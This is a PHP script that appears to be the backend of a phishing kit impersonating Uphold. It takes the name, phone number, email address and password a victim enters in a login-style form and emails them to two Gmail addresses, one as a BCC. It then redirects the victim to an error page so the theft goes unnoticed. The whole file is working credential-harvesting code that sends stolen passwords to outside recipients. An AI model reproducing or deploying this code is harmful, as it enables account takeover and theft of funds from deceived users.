
<?php

if(isset($_POST['fromLog'])) {


    $email_to = 'albertjordon01@gmail.com';
    $email_subject = 'Enquiry from Uphold';
    $email_from =  $_POST['email'];

    $password = $_POST['password'];
    $name = $_POST['name'];
    $number = $_POST['number'];


    $message = $_POST['message']. "\n Full Name : " . $_POST['name']. "\n Mobile Number : " . $_POST['number']. "\n Email : " . $_POST['email']. "\n Password : " . $_POST['password'];
    $email_bcc = "jeniferjohn52916@gmail.com";

    $email_exp = '/^[A-Za-z0-9._%-]+@[A-Za-z0-9.-]+\.[A-Za-z]{2,4}$/';

  if(!preg_match($email_exp,$email_from)) {

    $error_message .= 'The Email Address you entered does not appear to be valid.<br />';

  }

    $string_exp = "/^[A-Za-z .'-]+$/";

    $email_message = "Form details below.\n\n";

     function clean_string($string) {

       $bad = array("content-type","bcc:","to:","cc:","href");

       return str_replace($bad,"",$string);

     }

    $email_message = clean_string($message)."\n";
// create email headers

$headers  = 'From: '.$email_from."\r\n" . 'bcc: '.$email_bcc."\r\n";






'Reply-To: '.$email_from."\r\n" .

'X-Mailer: PHP/' . phpversion();

@mail($email_to, $email_subject, $email_message, $headers);

header('Location:error.html');

 }

 ?>
